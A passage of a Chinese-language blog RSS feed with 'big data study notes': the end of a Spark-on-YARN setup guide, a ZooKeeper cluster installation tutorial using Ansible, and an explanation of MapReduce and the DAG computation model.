    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ ansible slave -m copy -a &#39;src=/opt/spark-2.1.0/conf/ dest=/opt/spark-2.1.0/conf/&#39;
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;使用spark_shuffle，修改$HADOOP_HOME/etc/hadoop/yarn-site.xml:&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &amp;lt;property&amp;gt;
   &amp;lt;name&amp;gt;yarn.nodemanager.aux-services&amp;lt;/name&amp;gt;
   &amp;lt;value&amp;gt;mapreduce_shuffle,spark_shuffle&amp;lt;/value&amp;gt;
 &amp;lt;/property&amp;gt;
 &amp;lt;property&amp;gt;
   &amp;lt;name&amp;gt;yarn.nodemanager.aux-services.spark_shuffle.class&amp;lt;/name&amp;gt;
   &amp;lt;value&amp;gt;org.apache.spark.network.yarn.YarnShuffleService&amp;lt;/value&amp;gt;
 &amp;lt;/property&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;配置了5之后需要将spark的yarn目录里的spark-2.1.0-yarn-shuffle.jar加入yarn classpath:&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ yarn classpath
 # 将spark-network-shuffle_2.11-2.1.0.jar放入上述输出的某一路径中，如/opt/hadoop-2.7.3/share/hadoop/yarn/lib/下
 $ ansible all -a &#39;cp /opt/spark-2.1.0/yarn/spark-2.1.0-yarn-shuffle.jar /opt/hadoop-2.7.3/share/hadoop/yarn/&#39;
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;配置了5之后需要修改$HADOOP_HOME/etc/hadoop/yarn-env.sh:&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; # 因为使用了spark_shuffle，因此需要提高YARN_HEAPSIZE，避免在shuffle过程中的garbage collection问题
 YARN_HEAPSIZE=5000
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;分发Hadoop配置文件&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ ansible slave -m copy -a &#39;src=/opt/hadoop-2.7.3/etc/hadoop/ dest=/opt/hadoop-2.7.3/etc/hadoop/&#39;
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;spark-2&quot;&gt;启动Spark&lt;/h3&gt;
&lt;hr /&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;启动Spark的所有进程，包括Master、Worker:&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ /opt/spark-2.1.0/sbin/start-all.sh
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;(在主节点)启动HistoryServer，启动的进程应包括HistoryServer：&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ /opt/spark-2.1.0/sbin/start-history-server.sh
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;spark-3&quot;&gt;测试Spark&lt;/h3&gt;
&lt;hr /&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;使用jps查看各节点起的进程&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ ansible all -a &#39;/opt/jdk1.8.0_121/bin/jps&#39;

 cat1: Master, HistoryServer, QuorumPeerMain, DFSZKFailoverController, NameNode, ResourceManager
 cat2: QuorumPeerMain, DFSZKFailoverController, NameNode
 cat3: QuorumPeerMain
 cat4-12: Worker, JournalNode, DataNode, NodeManager
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;测试，运行SparkPi例子:&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ /opt/spark-2.1.0/bin/spark-submit --class org.apache.spark.examples.SparkPi \
 --master yarn-cluster \
 --num-executors 3 \
 --driver-memory 2g \
 --executor-memory 1g \
 --executor-cores 1 \
 --queue thequeue \
 /opt/spark-2.1.0/examples/jars/spark-examples_2.11-2.1.0.jar \
 10
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;查看结果:&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ yarn logs -applicationId ${applicationId} | grep &#39;Pi&#39;
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;在界面&lt;a href=&quot;http://10.2.2.141:18080/&quot;&gt;http://10.2.2.141:18080/&lt;/a&gt;查看历史&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;
</description>
        <pubDate>Sun, 15 Jan 2017 08:00:00 +0800</pubDate>
        <link>https://wuyinan0126.github.io/2017/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(6)-Spark/</link>
        <guid isPermaLink="true">https://wuyinan0126.github.io/2017/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(6)-Spark/</guid>
        
        <category>原创</category>
        
        <category>大数据</category>
        
        
        <category>原创</category>
        
        <category>大数据</category>
        
      </item>
    
      <item>
        <title>&lt;font color=&#39;red&#39;&gt;[原创]&lt;/font&gt; 大数据学习笔记(5)-分布式协调系统</title>
        <description>&lt;p&gt;**&lt;/p&gt;

&lt;h2 id=&quot;section&quot;&gt;分布式协调系统&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;分布式协调系统处理分布式环境下的协调管理问题，例如：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;当系统中加入一个新进程或节点时，如何自动获得配置参数&lt;/li&gt;
  &lt;li&gt;当配置参数被某个进程或节点修改时，如何实时通知被影响的进程或节点&lt;/li&gt;
  &lt;li&gt;当主节点发生故障时，如何快速选举出新的主节点&lt;/li&gt;
  &lt;li&gt;如何在分布式环境中实现锁服务&lt;/li&gt;
  &lt;li&gt;如何在多个进程或节点间实现任务同步&lt;/li&gt;
  &lt;li&gt;如何判断集群中某个节点是否存活&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;分布式协调系统中较著名的系统有Google的Chubby分布式锁服务和Yahoo的ZooKeeper协调系统。&lt;/p&gt;

&lt;h2 id=&quot;zookeeper&quot;&gt;Zookeeper&lt;/h2&gt;
&lt;hr /&gt;

&lt;h2 id=&quot;zookeeper349&quot;&gt;安装Zookeeper（版本3.4.9）&lt;/h2&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;section-1&quot;&gt;准备工作&lt;/h3&gt;
&lt;hr /&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;按照&lt;a href=&quot;https://wuyinan0126.github.io/2016/大数据学习笔记(1)-Overview/&quot;&gt;大数据学习笔记(1)-Overview&lt;/a&gt;做好部署前提准备&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;下载Zookeeper二进制包，并分发到所有zookeeper节点，并解压至/opt/:&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ ansible zookeeper -m copy -a &#39;src=/home/cat/cat/zookeeper-3.4.9.tar.gz dest=/home/cat/cat/&#39;
 $ ansible zookeeper -a &#39;tar -zxvf /home/cat/cat/zookeeper-3.4.9.tar.gz -C /opt/&#39;
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;创建数据文件夹、日志文件夹和myid文件:&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ ansible zookeeper -a &#39;mkdir -p /opt/zookeeper-3.4.9/var/data&#39;
 $ ansible zookeeper -a &#39;mkdir -p /opt/zookeeper-3.4.9/var/log&#39;
 $ ansible zookeeper -a &#39;touch /opt/zookeeper-3.4.9/var/data/myid&#39;
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;zookeeper-1&quot;&gt;配置Zookeeper&lt;/h3&gt;
&lt;hr /&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;conf/zoo.cfg&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; # 这个时间(ms)是作为Zookeeper服务器之间或客户端与服务器之间维持心跳的时间间隔
 tickTime=2000

 # Zookeeper服务器集群中的Follower服务器初始化连接时最长能忍受多少个心跳时间间隔数。当已经超过10个tickTime的时间长度后Leader服务器还没有收到Follower的返回信息，表明这个Follower连接失败
 initLimit=10

 # 标识Leader与Follower之间发送消息，请求和应答时间长度最长不能超过多少个tickTime的时间长度
 syncLimit=5

 # 客户端连接Zookeeper服务器的端口，Zookeeper会监听这个端口，接受客户端的访问请求。
 clientPort=2181

 # Zookeeper存放数据，也把zookeeper服务器的ID文件保存到这个目录下
 dataDir=/opt/zookeeper-3.4.9/var/data
 # 数据的log日志
 dataLogDir=/opt/zookeeper-3.4.9/var/log

 # 所有安装Zookeeper的主机，必须是奇数台，不用使用全部。server.ID，ID写入每台主机的{dataDir}/myid中
 server.1=cat1:2888:3888 
 server.2=cat2:2888:3888
 server.3=cat3:2888:3888
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;bin/zkEnv.sh&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; # Zookeeper的Log日志
 export ZOO_LOG_DIR=&quot;/opt/zookeeper-3.4.9/var/log&quot; 
 export JAVA_HOME=&quot;/opt/jdk1.8.0_121&quot;
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;var/data/myid&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; # 根据conf/zoo.cfg内容，例如本机为cat1，则myid文件内容为：
 1
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;zookeeper-2&quot;&gt;分发Zookeeper配置文件&lt;/h3&gt;
&lt;hr /&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;分发Zookeeper配置文件conf/zoo.cfg和bin/zkEnv.sh&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ ansible zookeeper -m copy -a &#39;src=/opt/zookeeper-3.4.9/conf/zoo.cfg dest=/opt/zookeeper-3.4.9/conf/&#39;
 $ ansible zookeeper -m copy -a &#39;src=/opt/zookeeper-3.4.9/bin/zkEnv.sh dest=/opt/zookeeper-3.4.9/bin/&#39;
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;登录到每台zookeeper主机中修改{dataDir}/myid&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; cat@cat1:~$ echo &quot;1&quot; &amp;gt; /opt/zookeeper-3.4.9/var/data/myid 
 cat@cat2:~$ echo &quot;2&quot; &amp;gt; /opt/zookeeper-3.4.9/var/data/myid 
 cat@cat3:~$ echo &quot;3&quot; &amp;gt; /opt/zookeeper-3.4.9/var/data/myid 
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;zookeeper-3&quot;&gt;启动Zookeeper&lt;/h3&gt;
&lt;hr /&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;在所有zookeeper节点启动Zookeeper服务器&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ zkServer.sh start
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;zookeeper-4&quot;&gt;测试Zookeeper&lt;/h3&gt;
&lt;hr /&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;在所有zookeeper节点查看zookeeper状态。如果启动失败，查看/opt/zookeeper-3.4.9/var/log/zookeeper.out日志&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ zkServer.sh status
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;hadoop-hahttpswuyinan0126githubio20162-hadoop&quot;&gt;下一步：&lt;a href=&quot;https://wuyinan0126.github.io/2016/大数据学习笔记(2)-Hadoop/&quot;&gt;安装Hadoop HA&lt;/a&gt;&lt;/h2&gt;
&lt;hr /&gt;
</description>
        <pubDate>Mon, 02 Jan 2017 08:00:00 +0800</pubDate>
        <link>https://wuyinan0126.github.io/2017/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(5)-%E5%88%86%E5%B8%83%E5%BC%8F%E5%8D%8F%E8%B0%83%E7%B3%BB%E7%BB%9F/</link>
        <guid isPermaLink="true">https://wuyinan0126.github.io/2017/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(5)-%E5%88%86%E5%B8%83%E5%BC%8F%E5%8D%8F%E8%B0%83%E7%B3%BB%E7%BB%9F/</guid>
        
        <category>原创</category>
        
        <category>大数据</category>
        
        
        <category>原创</category>
        
        <category>大数据</category>
        
      </item>
    
      <item>
        <title>&lt;font color=&#39;red&#39;&gt;[原创]&lt;/font&gt; 大数据学习笔记(4)-分布式文件系统</title>
        <description>&lt;p&gt;&lt;em&gt;深入学习GFS、HDFS的…等&lt;/em&gt;&lt;/p&gt;

&lt;h2 id=&quot;gfs&quot;&gt;GFS&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2016-12-04-1.png&quot; alt=&quot;Hadoop的MapReduce运行机制&quot; title=&quot;Hadoop的MapReduce运行机制&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;未完待续&lt;/strong&gt;&lt;/p&gt;

</description>
        <pubDate>Tue, 06 Dec 2016 08:00:00 +0800</pubDate>
        <link>https://wuyinan0126.github.io/2016/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(4)-%E5%88%86%E5%B8%83%E5%BC%8F%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/</link>
        <guid isPermaLink="true">https://wuyinan0126.github.io/2016/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(4)-%E5%88%86%E5%B8%83%E5%BC%8F%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/</guid>
        
        <category>原创</category>
        
        <category>大数据</category>
        
        
        <category>原创</category>
        
        <category>大数据</category>
        
      </item>
    
      <item>
        <title>&lt;font color=&#39;red&#39;&gt;[原创]&lt;/font&gt; 大数据学习笔记(3)-计算模型</title>
        <description>&lt;p&gt;&lt;em&gt;深入学习MapReduce、DAG计算模型，介绍了MapReduce计算模型的运行机制、优点和不足、计算模式，和一种更高效的的计算框架——DAG模型的图结构描述&lt;/em&gt;&lt;/p&gt;

&lt;h2 id=&quot;mapreduce&quot;&gt;MapReduce&lt;/h2&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;mapreduce-1&quot;&gt;MapReduce运行机制&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2016-12-04-1.png&quot; alt=&quot;Hadoop的MapReduce运行机制&quot; title=&quot;Hadoop的MapReduce运行机制&quot; /&gt;&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;MapReduce计算框架将应用的输入数据分割成若干block（自Hadoop-2.2起，默认为128M），存入HDFS&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;集群中的Master负责为Worker分配Map或Reduce任务，并做一些全局管理；任务数可由开发者指定&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Map阶段：被分配到Map任务的Worker读取对应的block，从block中解析出Key/Value对，并传递给Map函数，执行业务逻辑，将中间结果Key/Value对缓存在内存中&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Patition阶段：缓存的中间结果会周期性地被Spill入&lt;strong&gt;本地磁盘&lt;/strong&gt;，写入磁盘前被Partitioner分割为R份，R为Reduce任务数，分割函数一般是用Key对R哈希取模。在分割后将R个临时文件位置通知给Master，Master将其转交给Reduce任务的Worker&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Sort&amp;amp;Combine阶段：在写入磁盘前，对中间结果进行&lt;strong&gt;局部&lt;/strong&gt;排序，然后运行Combiner对数据进行合并，即对中间数据中具有相同Key的Value值进行合并，合并的业务逻辑和Reduce阶段的逻辑是相似的，这样可以大大减少中间数据量，减少网络传输量&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Shuffle阶段：当某个Reduce任务的Worker接收到Master的通知后，其通过RPC(Remote Procedure Call)将Map任务产生的属于自己的M份临时文件&lt;strong&gt;Pull&lt;/strong&gt;到本地，M为Map任务数。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Reduce阶段：将M分临时文件中局部Key有序的数据进行Merge Sort进行全局排序，然后执行Reduce函数，并将结果追加到这个Reduce任务对应的结果文件结尾&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;mapreduce-2&quot;&gt;MapReduce优点和不足&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;优点：&lt;/p&gt;

    &lt;ol&gt;
      &lt;li&gt;
        &lt;p&gt;极强的可扩展性、良好的容错性、简单性（即用户只要完成Map和Reduce函数即可）&lt;/p&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;数据的高吞吐量、支持海量数据处理的大规模并行处理、细粒度容错&lt;/p&gt;
      &lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;不足：&lt;/p&gt;

    &lt;ol&gt;
      &lt;li&gt;
        &lt;p&gt;不适合对实效性要求高的应用场景（如交互式查询、流式计算）&lt;/p&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;不适合迭代运算类的机器学习及数据挖掘类的应用&lt;/p&gt;
      &lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;不足的原因：&lt;/p&gt;

    &lt;ol&gt;
      &lt;li&gt;
        &lt;p&gt;Map和Reduce任务启动时间较长。对于批处理任务来说，启动时间对于任务执行时间所占比例不大，但对于高实效性的应用来说，所占比例太高&lt;/p&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;在一次任务执行过程中，MapReduce计算模型存在多处的磁盘读写、网络传输的过程。如初始block读取、Map任务的中间结果保存入磁盘、Shuffle阶段的网络传输、Reduce阶段的磁盘读和HDFS写等。对于迭代式机器学习应用，往往需要一个任务反复迭代进行，此时磁盘读写、网络传输的开销造成效率低下&lt;/p&gt;
      &lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;mapreduce-3&quot;&gt;MapReduce计算模式&lt;/h3&gt;

&lt;p&gt;实际应用中的大部分ETL任务都可以归结为MapReduce计算模式或其变体，如：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;求和模式：包括数值求和（Value为数值），记录求和（Value为非数值，累加形成队列）&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;过滤模式：简单过滤（Map实现过滤函数，无Reduce阶段），Top K记录（Map实现统计局部Top K，Reduce实现全局Top K）&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;组织数据模式：&lt;/p&gt;

    &lt;ol&gt;
      &lt;li&gt;
        &lt;p&gt;数据分片：例如将所有记录按日期进行分类，需要将同一时间的数据放到一起，此时需要修改Partion策略，默认的Partition策略为hash取模&lt;/p&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;全局排序：MapReduce自带的排序特性，在Reduce阶段需要先将中间数据按Key进行Merge Sort，因此只需要修改Partion策略，保证不同的Reducer处理一个区间范围的记录，例如将Key为1-1000的数据给Reducer1处理，key为1001-2000点数据交给Reducer2处理，这样将所有Reducer的输出拼接在一起即可得到全局排序&lt;/p&gt;
      &lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Join模式：&lt;/p&gt;

    &lt;ol&gt;
      &lt;li&gt;
        &lt;p&gt;Reduce-Side Join：需要输入两个数据集，区分方式为：连表的外键作为Key，记录的其他内容作为Value，在Value中增加一个标志信息，表明记录属于哪个数据集。然后在Reduce阶段将相同Key，不同数据集的记录做Join。该方式较通用，但需要经过若干轮中间数据的磁盘读写、Shuffle阶段的网络传输、Reduce阶段的排序等耗时的操作，因此计算效率较低&lt;/p&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;Map-Side Join：只需要输入一个大数据集，小数据集放入内存哈希表中，以外键作为哈希表的Key。此时只需要在Map阶段对大数据的每条记录查找哈希表进行Join操作。由于避免了Shuffle阶段的网络传输、Reduce阶段的排序等耗时的操作，因此该方式效率较高，但要求小数据集必须足够小到能放入内存&lt;/p&gt;
      &lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;dag&quot;&gt;一种更高效的的计算框架——DAG&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;虽然MapReduce提供了简介的借口，用户只需完成Map和Reduce函数的业务逻辑就可以实现大规模数据批处理任务，但是其支持的运算符仅仅限定与Map和Reduce两类，所以在表达能力上不够丰富。&lt;/p&gt;

&lt;p&gt;另外，MapReduce计算模型的本质是由Map和Reduce序列两个阶段完成的，在Map任务阶段有个任务同步过程，只有在所有Map任务执行完成才能开始Reduce阶段的任务。&lt;/p&gt;

&lt;p&gt;从上可以看出MapReduce对于子任务之间复杂的交互和依赖关系缺乏表达能力，因此，一种更高效的的计算框架——DAG氤氲而生。DAG计算模型可以认为是对MapReduce计算模型的一种扩展（可以将MapReduce模型看作DAG模型的一种特例）。DAG模型可以表达复杂的并发任务之间的依赖关系，提供了丰富的运算符，使其表达能力和灵活性更加强大。&lt;/p&gt;

&lt;p&gt;DAG的全称是”Directed Acyclic Graph”(有向无环图)，是指将计算任务分解成若干子任务，这些子任务之间由逻辑关系或运行先后顺序等因素被构建成有向无环图结构。&lt;/p&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;dag-1&quot;&gt;DAG图结构描述&lt;/h3&gt;

&lt;p&gt;以微软的Dryad为例，其采用了若干简单的DAG结构及其描述符的不断组合来构建复杂结构的方式。可以形式化地用以下方式描述一个DAG图结构：&lt;/p&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;G=\{ {V}_{G},{E}_{G},{I}_{G},{O}_{G} \}&lt;/script&gt;

&lt;p&gt;其中，VG代表图节点集合，EG代表有向边集合；IG是VG的子集，表示DAG图中的数据输入节点集合；OG也是VG的子集，表示DAG图中数据输出节点集合。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;一个基本的图描述符为G^k，表示一个计算结构并发为k个，如下图：&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2016-12-04-2.png&quot; alt=&quot;A^n&quot; title=&quot;A^n&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;图结构串行连接G3 = G1 · G2，由图G1和图G2的所有节点和边构成，图G1的输入节点构成图G3的输入节点，图G2的输出节点构成图G3的输出节点，图G1的输出节点到图G2的输入节点之间构建新的有向边。这种关系可以定义下列两个描述符：&lt;/p&gt;

    &lt;ul&gt;
      &lt;li&gt;G1 &amp;gt;= G2：图G1的输出节点和图G2的输入节点间进行点对点的边连接，采用Round Robin(轮询)的方式构建有向边：
        &lt;ul&gt;
          &lt;li&gt;如果|OG1|&amp;gt;=|IG2|，此时G2的输入节点中某些节点输入边可能大于1条&lt;/li&gt;
          &lt;li&gt;如果|OG1|&amp;lt;|IG2|，此时G2的输入节点中有些节点没有输入边&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;G1 » G2: 图G1的输出节点和图G2的输入节点之间形成完全二分图。**MapReduce架构即为由并发执行的Map阶段的图G1和Reduce阶段的图G2串行而成的完全二分图，如下图：&lt;/li&gt;
    &lt;/ul&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/2016-12-04-3.png&quot; alt=&quot;AS &amp;gt;&amp;gt; BS&quot; title=&quot;AS &amp;gt;&amp;gt; BS&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;G1 || G2：代表图结构水平融合，允许图G1和图G2有相同的节点，融合时合并相同节点，如下图，是由图B &amp;gt;= C和图B &amp;gt;= D水平融合得到的：&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2016-12-04-4.png&quot; alt=&quot;B &amp;gt;= C || B &amp;gt;= D&quot; title=&quot;B &amp;gt;= C \|\| B &amp;gt;= D&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;通过以上几个基础的描述符，可以构建复杂的图结构，如下图：&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2016-12-04-5.png&quot; alt=&quot;复杂图结构&quot; title=&quot;复杂图结构&quot; /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;dag-2&quot;&gt;DAG图任务执行&lt;/h3&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;未完待续&lt;/strong&gt;&lt;/p&gt;
</description>
        <pubDate>Sun, 04 Dec 2016 08:00:00 +0800</pubDate>
        <link>https://wuyinan0126.github.io/2016/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(3)-%E8%AE%A1%E7%AE%97%E6%A8%A1%E5%9E%8B/</link>
        <guid isPermaLink="true">https://wuyinan0126.github.io/2016/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(3)-%E8%AE%A1%E7%AE%97%E6%A8%A1%E5%9E%8B/</guid>
        
        <category>原创</category>
        
        <category>大数据</category>
        
        
        <category>原创</category>
        
        <category>大数据</category>
        
      </item>
    
  </channel>
</rss>